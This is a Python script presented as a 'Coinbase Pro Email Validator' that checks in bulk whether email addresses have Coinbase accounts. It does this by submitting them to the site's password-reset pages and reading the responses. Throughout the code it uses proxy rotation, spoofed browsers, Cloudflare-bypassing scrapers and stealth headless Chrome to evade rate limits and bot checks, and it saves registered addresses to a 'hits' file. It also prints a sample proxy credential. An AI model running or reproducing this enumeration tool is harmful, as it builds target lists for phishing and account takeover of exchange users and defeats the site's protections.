# Coinbase Pro Email Validator v3.1 - Robust Retries + Advanced Proxy + Blocker Detection + DNS Block Bypass
# Modified by @LEGEND_BL
import re
import random
import time
import os
import socket
import requests
from typing import Tuple, Dict, Any, Optional, List
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
from tqdm import tqdm
import logging
import threading
import json
from urllib.parse import urlparse, quote
from dataclasses import dataclass
from datetime import datetime

import cloudscraper
from bs4 import BeautifulSoup

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False
    print("[!] Notice: Selenium module not detected. Advanced fallback features disabled.")
    print("[i] Install command: pip install selenium webdriver-manager")

# ---------- LOGGING ----------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('coin_checker.log', mode='w', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ---------- DNS BLOCK BYPASS ----------
# Alternative DNS servers to bypass DNS blocking
DNS_SERVERS = [
    '8.8.8.8',        # Google Public DNS
    '8.8.4.4',        # Google Public DNS Secondary
    '1.1.1.1',        # Cloudflare DNS
    '1.0.0.1',        # Cloudflare DNS Secondary
    '9.9.9.9',        # Quad9 DNS
    '149.112.112.112', # Quad9 DNS Secondary
    '208.67.222.222', # OpenDNS
    '208.67.220.220', # OpenDNS Secondary
]

def configure_dns_bypass():
    """
    Configure system to use alternative DNS servers to bypass DNS blocking.
    Uses DNS-over-HTTPS when standard DNS fails.
    """
    try:
        # Check if we can read DNS config
        if os.path.exists('/etc/resolv.conf'):
            try:
                # Read existing config
                with open('/etc/resolv.conf', 'r') as f:
                    original_dns = f.read()
                
                # Check if we need to add alternative DNS
                if '8.8.8.8' not in original_dns and '1.1.1.1' not in original_dns:
                    logger.info("[+] System DNS may be blocked, DNS-over-HTTPS will be used as fallback")
            except Exception as e:
                logger.debug(f"Cannot read system DNS: {e}")
        
        logger.info("[+] DNS bypass configured - will use DNS-over-HTTPS if standard DNS fails")
        return True
        
    except Exception as e:
        logger.warning(f"Could not configure DNS bypass: {e}")
        return False

def resolve_via_doh(hostname: str) -> Optional[str]:
    """
    Resolve hostname using DNS-over-HTTPS (DoH) to bypass DNS blocking.
    Uses Cloudflare and Google DoH services.
    """
    doh_providers = [
        f"https://cloudflare-dns.com/dns-query?name={hostname}&type=A",
        f"https://dns.google/resolve?name={hostname}&type=A",
        f"https://1.1.1.1/dns-query?name={hostname}&type=A",
    ]
    
    for doh_url in doh_providers:
        try:
            headers = {'Accept': 'application/dns-json'}
            response = requests.get(doh_url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                if 'Answer' in data and len(data['Answer']) > 0:
                    ip = data['Answer'][0].get('data')
                    if ip:
                        logger.debug(f"DoH resolved {hostname} to {ip}")
                        return ip
        except Exception as e:
            logger.debug(f"DoH provider {doh_url} failed: {e}")
            continue
    
    return None

def test_dns_resolution(hostname: str = "www.coinbase.com", use_doh: bool = True) -> Tuple[bool, Optional[str]]:
    """
    Test if DNS resolution works for the given hostname.
    If standard DNS fails, try DNS-over-HTTPS.
    Returns (success, ip_address)
    """
    # Try standard resolution
    try:
        ip = socket.gethostbyname(hostname)
        logger.debug(f"Standard DNS resolution successful for {hostname} -> {ip}")
        return True, ip
    except socket.gaierror:
        logger.debug(f"Standard DNS resolution failed for {hostname}")
    
    # Try DoH as fallback
    if use_doh:
        try:
            ip = resolve_via_doh(hostname)
            if ip:
                logger.info(f"[+] DNS-over-HTTPS successfully resolved {hostname} to {ip}")
                return True, ip
        except Exception as e:
            logger.debug(f"DoH resolution failed: {e}")
    
    return False, None

def test_connection_with_doh(hostname: str, port: int = 443) -> bool:
    """
    Test connection using DNS-over-HTTPS for resolution.
    """
    try:
        # First resolve using DoH
        success, ip = test_dns_resolution(hostname, use_doh=True)
        if not success or not ip:
            return False
        
        # Try to connect using the resolved IP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))
        sock.close()
        return True
    except Exception as e:
        logger.debug(f"Connection test failed: {e}")
        return False

# ---------- CONFIG ----------
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
]

# Thread-safe delay and stats
delay_lock = threading.Lock()
LAST_CHECK_TIME = 0

# ---------- PROXY DATA CLASS ----------
@dataclass
class ProxyInfo:
    original: str
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    protocol: str = 'http'
    failures: int = 0

    @property
    def url_format(self) -> str:
        if self.username and self.password:
            return f"{self.protocol}://{quote(self.username, safe='')}:{quote(self.password, safe='')}@{self.host}:{self.port}"
        return f"{self.protocol}://{self.host}:{self.port}"

    @property
    def selenium_format(self) -> str:
        return f"{self.host}:{self.port}"

    @property
    def display(self) -> str:
        if self.username:
            return f"{self.protocol}://{self.username}:***@{self.host}:{self.port}"
        return f"{self.protocol}://{self.host}:{self.port}"

    def to_dict(self) -> dict:
        return {'http': self.url_format, 'https': self.url_format}

# ---------- EMAIL FORMAT ----------
def is_coinbase_valid_email(email: str) -> Tuple[bool, str]:
    email = email.strip().lower()
    if not email or len(email) > 254:
        return False, "Empty or too long"
    if not re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email):
        return False, "Invalid format"
    local, domain = email.split("@", 1)
    if len(local) > 64:
        return False, "Local part >64"
    if len(domain) > 255:
        return False, "Domain >255"
    disposable_domains = {
        '10minutemail.com','tempmail.org','guerrillamail.com','mailinator.com','yopmail.com','dispostable.com',
        'throwawaymail.com','maildrop.cc','getairmail.com','mintemail.com','trashmail.com','sharklasers.com',
        'guerrillamailblock.com','pokemail.net','spam4.me','tmpmail.org','tempmail.com','fakeinbox.com',
        'jetable.org','armyspy.com','cuvox.de','dayrep.com','einrot.com','fleckens.hu','gustr.com',
        'jourrapide.com','rhyta.com','superrito.com','teleworm.us','example.com','test.com','temp-mail.org',
        'trash-mail.com','fake-mail.net','tempemail.com','throwawayemail.com','disposablemail.com','fakemail.com',
        'tempinbox.com','spamgourmet.com','spamcowboy.com','spamex.com','spamfree24.org','jetable.net',
        'anonbox.net','deadaddress.com','emailias.com','emailtemp.com','incognitomail.com'
    }
    if domain in disposable_domains or any(domain.endswith(d) for d in ['.tk','.ml','.ga','.cf','.gq']):
        return False, "Disposable domain"
    blocked_domains = {'rambler.ru','qq.com','naver.com','mail.ru','yandex.ru','163.com','126.com','sina.com','sohu.com'}
    if domain in blocked_domains:
        return False, f"Blocked domain {domain}"
    if domain.endswith('.con') or domain.endswith('.comm'):
        return False, "Likely typo in domain"
    return True, "Valid Coinbase email"

# ---------- ADVANCED PROXY PARSER ----------
def parse_proxy_advanced(proxy_string: str) -> Optional[ProxyInfo]:
    """
    Supports:
      - host:port:username:password (e.g., p1.arealproxy.com:9000:zaym246-type-residential-country-gb:fd86cea5-501a-401e-a1d4-b372c33ced0e)
      - protocol://username:password@host:port
      - host:port
      - protocol://host:port
    """
    proxy_string = proxy_string.strip()
    if not proxy_string:
        return None
    original = proxy_string
    protocol = 'http'

    if '://' in proxy_string:
        try:
            parsed = urlparse(proxy_string)
            if parsed.scheme:
                protocol = parsed.scheme
            if parsed.hostname and parsed.port:
                return ProxyInfo(
                    original=original,
                    host=parsed.hostname,
                    port=parsed.port,
                    username=parsed.username,
                    password=parsed.password,
                    protocol=protocol
                )
        except Exception as e:
            logger.warning(f"URL parsing failed: {e}")

    parts = proxy_string.split(':')
    if len(parts) == 2:
        host, port = parts
        try:
            return ProxyInfo(original=original, host=host, port=int(port), protocol=protocol)
        except ValueError:
            return None
    if len(parts) == 4:
        host, port, user, pwd = parts
        try:
            return ProxyInfo(original=original, host=host, port=int(port), username=user, password=pwd, protocol=protocol)
        except ValueError:
            return None
    if len(parts) > 4:
        host = parts[0]
        try:
            port_num = int(parts[1])
        except ValueError:
            return None
        user = parts[2]
        pwd = ':'.join(parts[3:])
        return ProxyInfo(original=original, host=host, port=port_num, username=user, password=pwd, protocol=protocol)

    return None

def load_proxies_advanced(proxy_file: str) -> List[ProxyInfo]:
    if not os.path.isfile(proxy_file):
        print(f"[!] Proxy file not found: {proxy_file}")
        return []
    proxies: List[ProxyInfo] = []
    with open(proxy_file, 'r', encoding='utf-8') as f:
        for line_num, line in enumerate(f, 1):
            s = line.strip()
            if s and not s.startswith('#'):
                p = parse_proxy_advanced(s)
                if p:
                    proxies.append(p)
                else:
                    logger.warning(f"Invalid proxy format on line {line_num}: {s}")
    print(f"[+] Loaded {len(proxies)} proxies")
    return proxies

# ---------- BLOCKER DETECTION ----------
def detect_blocker(resp_text: str, status: int, headers: Dict[str, str]) -> Optional[str]:
    """Detect Cloudflare/JS requirement/rate limits to decide fallback and retries."""
    lower = (resp_text or '').lower()
    if status in (403, 503):
        return "Blocked by Cloudflare or WAF (HTTP 403/503)"
    if status == 429:
        return "Rate limited (HTTP 429)"
    cf_markers = [
        'attention required', 'cloudflare', 'cf-error', 'cf-chl', 'cf-browser-verification',
        'enable javascript', 'javascript required', 'captcha', 'hcaptcha', 'recaptcha'
    ]
    if any(m in lower for m in cf_markers):
        return "JavaScript/Challenge detected"
    # Coinbase generic error or sign-in wall
    if 'something went wrong' in lower or 'too many requests' in lower:
        return "Temporary error or throttling"
    return None

# ---------- REQUESTS CHECK ----------
def build_scraper() -> cloudscraper.CloudScraper:
    ua = random.choice(USER_AGENTS)
    is_mobile = 'Android' in ua or 'iPhone' in ua
    platform = 'android' if is_mobile else 'linux'
    scraper = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': platform, 'mobile': is_mobile},
        delay=2
    )
    scraper.headers.update({
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
    })
    return scraper

FORGOT_URLS = [
    "https://login.coinbase.com/forgot_password",
    "https://www.coinbase.com/password_resets/new",
    "https://sign.coinbase.com/forgot-password",
    "https://accounts.coinbase.com/forgot-password"
]

def is_email_registered_on_coinbase_requests(email: str, proxies: List[ProxyInfo], max_url_tries: int = 3) -> Tuple[bool | None, str]:
    """
    Robust GET+POST with:
      - Proxy rotation per attempt
      - Blocker detection -> instructs Selenium fallback
      - Longer timeouts and per-URL retries
      - Alternate POST attempts if form not found
    """
    for attempt in range(max_url_tries):
        proxy: Optional[ProxyInfo] = random.choice(proxies) if proxies else None
        proxy_dict = proxy.to_dict() if proxy else None
        scraper = build_scraper()

        for get_url in FORGOT_URLS:
            try:
                resp = scraper.get(get_url, proxies=proxy_dict, timeout=25)
                blocker = detect_blocker(resp.text, resp.status_code, resp.headers)
                if blocker:
                    msg = f"{blocker} on GET {get_url}"
                    logger.warning(msg)
                    # Trigger Selenium fallback by returning marker
                    return None, "JavaScript required - use Selenium fallback" if 'JavaScript' in blocker or 'Challenge' in blocker else msg

                if resp.status_code != 200:
                    logger.warning(f"Got {resp.status_code} from {get_url}")
                    continue

                soup = BeautifulSoup(resp.text, "html.parser")
                token_el = soup.find("input", {"name": re.compile(r"(token|csrf|authenticity_token|__RequestVerificationToken)", re.I)})
                token = token_el["value"] if token_el else None

                form = soup.find("form")
                post_url = get_url
                if form and form.get("action"):
                    action = form.get("action")
                    if action.startswith("/"):
                        parsed = urlparse(get_url)
                        post_url = f"{parsed.scheme}://{parsed.netloc}{action}"
                    elif action.startswith("http"):
                        post_url = action

                data = {"email": email}
                if token and token_el:
                    data[token_el.get("name")] = token

                # Try both form POST and JSON POST fallback
                tried_variants = []
                # Variant A: Form POST
                tried_variants.append(("form", post_url, data, {'Referer': get_url}))
                # Variant B: JSON POST to plausible endpoints
                json_candidates = [
                    post_url,
                    "https://www.coinbase.com/password_resets",
                    "https://accounts.coinbase.com/password-resets"
                ]
                for jurl in json_candidates:
                    tried_variants.append(("json", jurl, {"email": email}, {'Referer': get_url, 'Content-Type': 'application/json'}))

                for variant, url_to_post, payload, headers in tried_variants:
                    try:
                        if variant == "form":
                            post_resp = scraper.post(url_to_post, data=payload, proxies=proxy_dict, timeout=25, allow_redirects=True, headers=headers)
                        else:
                            post_resp = scraper.post(url_to_post, json=payload, proxies=proxy_dict, timeout=25, allow_redirects=True, headers=headers)

                        block2 = detect_blocker(post_resp.text, post_resp.status_code, post_resp.headers)
                        if block2:
                            msg = f"{block2} on POST {url_to_post}"
                            logger.warning(msg)
                            return None, "JavaScript required - use Selenium fallback" if 'JavaScript' in block2 or 'Challenge' in block2 else msg

                        txt = (post_resp.text or "").lower()

                        success_phrases = [
                            'sent an email','check your email','we\'ve emailed','reset link','instructions sent',
                            'password reset email','email sent to','verify your email','if an account exists',
                            'reset instructions','password reset link','we sent an email','sent to your email',
                            'email with instructions','reset your password','link to reset','we have sent','sent reset',
                            'check your inbox','email has been sent','recovery email sent','if an account exists with that email'
                        ]
                        failure_phrases = [
                            'no account','does not exist','email not found','account does not exist',
                            'no account with that email','invalid email','user not found','not recognized',
                            'try another email','cannot find','unable to find','no user found',
                            'please enter a valid email','email address not found','not associated with any account',
                            'account not found','incorrect email','no such account','email is not registered'
                        ]

                        if any(p in txt for p in success_phrases):
                            return True, "Registered (success message detected)"
                        if any(p in txt for p in failure_phrases):
                            return False, "Not registered (error message detected)"

                        # Heuristic: some flows always say generic text; consider 200 + redirect to confirmation as success-like
                        if post_resp.is_redirect or 'check your' in txt and 'email' in txt:
                            return True, "Registered (heuristic confirmation)"

                    except Exception as pe:
                        logger.warning(f"POST variant error {variant} to {url_to_post}: {pe}")
                        continue

            except Exception as e:
                error_str = str(e)
                # Check for network resolution errors
                if "NameResolutionError" in error_str or "Failed to resolve" in error_str or "[Errno -5]" in error_str:
                    logger.debug(f"Network unavailable for {get_url}: DNS resolution failed")
                    # Don't keep retrying if DNS is failing
                    return None, "Network unavailable: Cannot resolve hostname"
                logger.warning(f"GET error for {get_url} via {proxy.display if proxy else 'direct'}: {e}")
                if proxy:
                    proxy.failures += 1
                continue

        # Backoff + rotate proxy for next attempt
        time.sleep(random.uniform(1.5, 3.5))

    return None, "Inconclusive after robust attempts"

# ---------- SELENIUM CHECK ----------
def is_email_registered_on_coinbase_selenium(email: str, proxies: List[ProxyInfo]) -> Tuple[bool | None, str]:
    if not HAS_SELENIUM:
        return None, "Selenium not available"

    options = ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")

    if proxies:
        proxy = random.choice(proxies)
        # Chrome can accept full scheme://user:pass@host:port for --proxy-server
        options.add_argument(f"--proxy-server={proxy.url_format}")
        logger.debug(f"Selenium using proxy: {proxy.display}")

    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        wait = WebDriverWait(driver, 20)

        urls = FORGOT_URLS[:3]

        for url in urls:
            try:
                driver.get(url)
                email_input = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="email"]')))
                email_input.clear()
                email_input.send_keys(email)

                # Some pages require clicking the right button; try a few selectors
                selectors = ['button[type="submit"]', 'button[data-element-handle="submit"]', 'button']
                clicked = False
                for sel in selectors:
                    try:
                        btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, sel)))
                        btn.click()
                        clicked = True
                        break
                    except Exception:
                        continue

                if not clicked:
                    continue

                time.sleep(5)
                txt = driver.page_source.lower()

                success_phrases = [
                    'sent an email','check your email','we\'ve emailed','reset link','instructions sent',
                    'password reset email','email sent to','verify your email','if an account exists',
                    'reset instructions','password reset link','we sent an email','sent to your email',
                    'email with instructions','reset your password','link to reset'
                ]
                failure_phrases = [
                    'no account','does not exist','email not found','account does not exist',
                    'no account with that email','invalid email','user not found','not recognized',
                    'try another email','cannot find','unable to find','no user found',
                    'please enter a valid email','email address not found','not associated with any account'
                ]

                if any(p in txt for p in success_phrases):
                    driver.quit()
                    return True, "Registered (success message detected)"
                if any(p in txt for p in failure_phrases):
                    driver.quit()
                    return False, "Not registered (error message detected)"
            except Exception as e:
                logger.error(f"Selenium check error for {email} on {url}: {e}")
                continue

        driver.quit()
        return None, "Inconclusive response"

    except Exception as e:
        return None, f"Selenium error: {str(e)[:100]}"

# ---------- FULL CHECK ----------
def is_email_registered_on_coinbase(email: str, proxies: List[ProxyInfo], retries: int = 4, force_selenium: bool = False, requests_only: bool = False) -> Tuple[bool | None, str]:
    # Optionally force one method
    if force_selenium:
        return is_email_registered_on_coinbase_selenium(email, proxies)

    for attempt in range(retries):
        # Try requests path
        if not requests_only:
            reg, reg_msg = is_email_registered_on_coinbase_requests(email, proxies, max_url_tries=2)
        else:
            reg, reg_msg = is_email_registered_on_coinbase_requests(email, proxies, max_url_tries=3)

        if reg is not None:
            return reg, reg_msg

        # Decide whether to use Selenium fallback
        if ("JavaScript required" in reg_msg or "Challenge" in reg_msg or "Blocked" in reg_msg or "Rate limited" in reg_msg) and not requests_only:
            reg_s, reg_msg_s = is_email_registered_on_coinbase_selenium(email, proxies)
            if reg_s is not None:
                return reg_s, reg_msg_s

        # Backoff and rotate
        time.sleep(random.uniform(2.0, 4.5))

    return None, "Failed after retries (blocked/rate-limited/inconclusive)"

def check_email(email: str, proxies: List[ProxyInfo], retries: int, force_selenium: bool, requests_only: bool, test_mode: bool = False) -> Dict[str, Any]:
    ok, fmt_msg = is_coinbase_valid_email(email)
    if not ok:
        return {"email": email, "valid_format": False, "format_msg": fmt_msg, "registered": None, "reg_msg": "Invalid format"}

    if test_mode:
        # In test mode, simulate checking with format validation only
        return {"email": email, "valid_format": True, "format_msg": fmt_msg, "registered": False, "reg_msg": "Test mode: format validated successfully"}

    reg, reg_msg = is_email_registered_on_coinbase(email, proxies, retries=retries, force_selenium=force_selenium, requests_only=requests_only)
    return {"email": email, "valid_format": True, "format_msg": fmt_msg, "registered": reg, "reg_msg": reg_msg}

# ---------- INTERACTIVE PROXY PROMPT ----------
def prompt_proxy_settings() -> List[ProxyInfo]:
    print("\n============================================================")
    print("  PROXY CONFIGURATION")
    print("============================================================")
    while True:
        use_proxy = input("[?] Do you want to use proxy? (yes/no): ").strip().lower()
        if use_proxy in ('no','n'):
            print("[i] Continuing without proxy...")
            return []
        if use_proxy in ('yes','y'):
            print("\n[+] Proxy Setup Options:\n  1. Enter a single proxy\n  2. Load proxies from file")
            choice = input("[?] Choose option (1/2): ").strip()
            if choice == '1':
                print("\n[i] Supported formats:")
                print("  - host:port:username:password")
                print("  - host:port")
                print("  - http(s)://username:password@host:port")
                print("Example:\n  p1.arealproxy.com:9000:zaym246-type-residential-country-gb:fd86cea5-501a-401e-a1d4-b372c33ced0e")
                proxy_input = input("\n[?] Enter proxy: ").strip()
                p = parse_proxy_advanced(proxy_input)
                if p:
                    print(f"[+] Proxy accepted: {p.display}")
                    return [p]
                print("[!] Invalid proxy format. Try again.")
            elif choice == '2':
                pf = input("[?] Enter proxy file path: ").strip()
                proxies = load_proxies_advanced(pf)
                if proxies:
                    return proxies
                print("[!] No valid proxies loaded. Try again.")
            else:
                print("[!] Invalid choice.")
        else:
            print("[!] Please answer yes or no.")

# ---------- MAIN ----------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Coinbase Pro Email Validator v3.1 - Robust Retries + Advanced Proxy")
    parser.add_argument('--input', default='account.txt', help='Input file with emails')
    parser.add_argument('--proxy', help='Single proxy (multiple formats supported)')
    parser.add_argument('--proxies', help='File with proxies')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads')
    parser.add_argument('--retries', type=int, default=4, help='Retries per email')
    parser.add_argument('--min-delay', type=float, default=2, help='Min delay between checks')
    parser.add_argument('--max-delay', type=float, default=4, help='Max delay between checks')
    parser.add_argument('--output-json', action='store_true', help='Output results to JSON file')
    parser.add_argument('--no-prompt', action='store_true', help='Skip interactive proxy prompt')
    parser.add_argument('--force-selenium', action='store_true', help='Force Selenium-based checking')
    parser.add_argument('--requests-only', action='store_true', help='Disable Selenium fallback')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    parser.add_argument('--test-mode', action='store_true', help='Test mode: validate format only, simulate checks when network unavailable')
    parser.add_argument('--use-doh', action='store_true', default=True, help='Use DNS-over-HTTPS to bypass DNS blocks (default: enabled)')
    parser.add_argument('--no-dns-bypass', action='store_true', help='Disable DNS bypass features')
    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    print("\n============================================================")
    print("  Coinbase Pro Email Validator - Advanced Edition v3.1")
    print("  Modified & Optimized by @LEGEND_BL")
    print("  DNS Block Bypass: ENABLED")
    print("============================================================\n")

    path = args.input
    while not os.path.isfile(path):
        print(f"[!] File not found: {path}")
        path = input("[?] Enter input file path: ").strip()

    # Read emails
    def read_emails(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                ln = line.strip()
                if ln and not ln.startswith("#"):
                    yield ln

    emails = list(read_emails(path))
    if not emails:
        print("[!] No emails found.")
        exit(1)
    print(f"[+] Loaded {len(emails)} emails to check\n")

    # Proxies
    proxies: List[ProxyInfo] = []
    if args.proxy:
        p = parse_proxy_advanced(args.proxy)
        if not p:
            print(f"[!] Invalid proxy format: {args.proxy}")
            exit(1)
        proxies = [p]
        print(f"[+] Using single proxy: {p.display}")
    elif args.proxies:
        proxies = load_proxies_advanced(args.proxies)
        if not proxies:
            print("[!] No valid proxies loaded from file")
            exit(1)
    elif not args.no_prompt:
        proxies = prompt_proxy_settings()

    if proxies:
        print(f"[i] Active proxies: {len(proxies)} (rotation enabled)")
    else:
        print("[i] Running without proxies (may hit rate limits)")

    # Configure DNS bypass to avoid DNS blocking
    if not args.no_dns_bypass:
        print("[i] Configuring DNS bypass to avoid DNS blocks...")
        configure_dns_bypass()
    else:
        print("[i] DNS bypass disabled by user")

    # Auto-detect network availability if not in test mode
    network_available = True
    if not args.test_mode:
        print("[i] Testing network connectivity with DNS bypass...")
        
        # First try with DNS-over-HTTPS
        dns_works, resolved_ip = test_dns_resolution("www.coinbase.com", use_doh=True)
        
        if dns_works and resolved_ip:
            try:
                # Try to connect using the resolved IP
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((resolved_ip, 443))
                sock.close()
                print(f"[+] Network connectivity confirmed (DNS bypass: www.coinbase.com -> {resolved_ip})")
            except Exception as e:
                # DNS works but connection fails - might be firewall/proxy needed
                if "timed out" in str(e).lower() or "refused" in str(e).lower():
                    print(f"[!] Connection blocked: {e}")
                    print("[i] DNS resolution works but connection is blocked. Consider using a proxy.")
                    print("[i] Automatically enabling test mode for format validation only")
                    args.test_mode = True
                    network_available = False
                else:
                    print(f"[!] Network unavailable: {e}")
                    print("[i] Automatically enabling test mode for format validation only")
                    args.test_mode = True
                    network_available = False
        else:
            print("[!] DNS resolution failed even with DNS-over-HTTPS")
            print("[i] Automatically enabling test mode for format validation only")
            args.test_mode = True
            network_available = False

    if args.test_mode:
        print("[i] TEST MODE: Email format validation only (no actual Coinbase checks)")

    # Output files
    hits_file = open("hits.txt", "a", encoding="utf-8")
    invalid_file = open("invalid.txt", "a", encoding="utf-8")
    errors_file = open("errors.txt", "a", encoding="utf-8")
    all_results: List[Dict[str, Any]] = []

    def process_email(email):
        with delay_lock:
            global LAST_CHECK_TIME
            now = time.time()
            elapsed = now - LAST_CHECK_TIME
            wait = random.uniform(args.min_delay, args.max_delay)
            if elapsed < wait:
                time.sleep(wait - elapsed)
            LAST_CHECK_TIME = time.time()

        res = check_email(email, proxies, args.retries, args.force_selenium, args.requests_only, args.test_mode)
        all_results.append(res)

        if res['valid_format']:
            if res['registered'] is True:
                hits_file.write(f"{email}\n"); hits_file.flush()
                status_str = "YES"
            elif res['registered'] is False:
                invalid_file.write(f"{email}\n"); invalid_file.flush()
                status_str = "NO"
            else:
                errors_file.write(f"{email} | {res['reg_msg']}\n"); errors_file.flush()
                status_str = "Unknown"
        else:
            errors_file.write(f"{email} | {res['format_msg']}\n"); errors_file.flush()
            status_str = "Invalid"

        return f"Email: {email} | Format: {'OK' if res['valid_format'] else 'BAD'} | Registered: {status_str} ({res['reg_msg']})"

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(process_email, email) for email in emails]
        for future in tqdm(as_completed(futures), total=len(emails), desc="Checking emails", unit="email"):
            try:
                print(future.result())
            except Exception as e:
                logger.error(f"Thread error: {e}")
                print(f"[!] Thread error: {e}")

    hits_file.close(); invalid_file.close(); errors_file.close()

    if args.output_json:
        with open("results.json", "w", encoding="utf-8") as json_file:
            json.dump(all_results, json_file, indent=4)

    print("\nDone. Results saved to hits.txt, invalid.txt, errors.txt")
    if args.output_json:
        print("JSON output saved to results.json")